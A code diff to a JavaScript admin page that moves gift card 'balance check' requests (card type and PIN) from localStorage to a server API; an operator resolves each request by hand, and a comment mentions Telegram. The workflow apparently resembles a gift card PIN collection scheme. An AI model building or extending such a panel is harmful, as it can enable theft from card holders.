@@ -221,7 +221,7 @@ async function syncResolvedHistoryToServer() {
   if (historySyncedOnce) return;
   historySyncedOnce = true;
 
-  const arr = getPendingRequests();
+  const arr = await fetch('/api/requests').then((r) => r.json()).then((d) => d.requests || []);
   const resolved = arr.filter((r) =>
     (r.status === 'resolved' || r.status === 'error') &&
     r.cardType &&
@@ -268,23 +268,28 @@ if (sessionStorage.getItem('gc_admin') === '1') {
 
 // ── Storage helpers ───────────────────────────────────────────
 function getPendingRequests() {
-  try { return JSON.parse(localStorage.getItem('gc_pending') || '[]'); }
-  catch { return []; }
+  return [];
 }
 function savePendingRequests(arr) {
-  localStorage.setItem('gc_pending', JSON.stringify(arr));
+  void arr;
 }
 
 // ── Add manual request ────────────────────────────────────────
-function addManualRequest() {
+async function addManualRequest() {
   const cardType = document.getElementById('manCardType').value;
   const reqId    = document.getElementById('manReqId').value.trim() || genId();
   const cardPin  = document.getElementById('manCardPin').value.trim() || '—';
 
-  const req = { id: reqId, cardType, cardPin, ts: Date.now(), status: 'pending' };
-  const arr = getPendingRequests();
-  arr.unshift(req);
-  savePendingRequests(arr);
+  await fetch('/api/requests', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      action: 'create',
+      id: reqId,
+      cardType,
+      cardPin: cardPin.toUpperCase(),
+    }),
+  });
 
   document.getElementById('manReqId').value = '';
   document.getElementById('manCardPin').value = '';
@@ -310,7 +315,7 @@ async function syncResolvedToServer(req, status, balance, requestId) {
   }
 }
 
-function resolveRequest(id, status) {
+async function resolveRequest(id, status) {
   const balanceInput = document.getElementById('bal_' + id);
   const balance = balanceInput ? balanceInput.value.trim() : '';
 
@@ -320,18 +325,19 @@ function resolveRequest(id, status) {
     return;
   }
 
-  // Write result to localStorage so main app can pick it up
-  if (status === 'ok') {
-    localStorage.setItem('balance_' + id, JSON.stringify({ balance }));
-  } else {
-    localStorage.setItem('balance_' + id, JSON.stringify({ error: 'Card not found or invalid PIN.' }));
-  }
-
-  // Mark request as resolved
-  const arr = getPendingRequests();
-  const req = arr.find(r => r.id === id);
-  if (req) { req.status = status === 'ok' ? 'resolved' : 'error'; req.balance = balance; }
-  savePendingRequests(arr);
+  const all = await fetch('/api/requests').then((r) => r.json()).then((d) => d.requests || []);
+  const req = all.find((r) => r.id === id);
+  if (!req) return;
+  await fetch('/api/requests', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      action: 'resolve',
+      id,
+      status,
+      balance,
+    }),
+  });
 
   // Also store latest resolved value by cardType+PIN so frontend can reuse
   // it immediately on revisit without sending Telegram again.
@@ -370,8 +376,8 @@ const CARD_LABELS =
     ? Object.fromEntries(CAROUSEL_CARDS.map((c) => [c.slug, c.label]))
     : { razer: 'Razer Gold', itunes: 'iTunes', stc: 'STC', mobily: 'Mobily', lebara: 'Lebara' };
 
-function renderRequests() {
-  const arr  = getPendingRequests();
+async function renderRequests() {
+  const arr  = await fetch('/api/requests').then((r) => r.json()).then((d) => d.requests || []);
   const list = document.getElementById('requestsList');
   const draftBalances = {};
   list.querySelectorAll('input[id^="bal_"]').forEach((inp) => {
@@ -442,9 +448,7 @@ function renderRequests() {
 // We read 'gc_pending' which the main app also writes to.
 // So both sides share the same key.
 
-window.addEventListener('storage', e => {
-  if (e.key === 'gc_pending') renderRequests();
-});
+window.addEventListener('focus', () => { renderRequests(); });
 
 // ── Helpers ───────────────────────────────────────────────────
 function genId() {
